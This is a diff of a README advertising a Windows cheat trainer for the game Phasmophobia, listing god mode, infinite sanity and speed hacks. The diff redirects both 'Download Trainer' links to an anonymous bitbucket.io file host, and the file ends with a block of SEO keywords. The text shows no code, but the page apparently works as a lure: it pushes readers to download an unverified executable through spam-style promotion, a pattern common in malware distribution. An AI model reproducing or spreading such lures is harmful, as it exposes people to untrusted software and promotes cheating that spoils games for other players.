@@ -6,7 +6,7 @@
 
 This tool is your ghost-hunting command center: **god mode**, **infinite sanity**, **item unlocker**, **ghost type reveal**, **speed hacks**, and more—all in one simple interface.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/phasmophobia/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 💻 Product Overview
@@ -17,7 +17,7 @@ The **Phasmophobia trainer** is a standalone Windows tool built for PC (Steam ve
 🎮 Works with controllers + hotkeys
 ⚙️ Beginner friendly, no scripting needed
 
-[![Download Trainer](https://files.vgtimes.ru/download/posts/2022-02/thumbs/1644497178_screenshot.webp)](https://wecheaters.github.io/cheats/phasmophobia/)
+[![Download Trainer](https://files.vgtimes.ru/download/posts/2022-02/thumbs/1644497178_screenshot.webp)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 🔧 Core Features of the Phasmophobia Trainer
@@ -130,3 +130,4 @@ Whether you're in it to speedrun contracts, troll your squad, or just vibe with 
 phasmophobia trainer, phasmophobia god mode, phasmophobia cheat tool, phasmophobia infinite sanity, phasmophobia esp, phasmophobia ghost reveal, phasmophobia unlock all items, phasmophobia auto objectives, phasmophobia no cooldowns, phasmophobia ghost hack, phasmophobia pc cheat, phasmophobia solo trainer, phasmophobia private hack, phasmophobia vr cheat, phasmophobia xp cheat
 
 ---
+
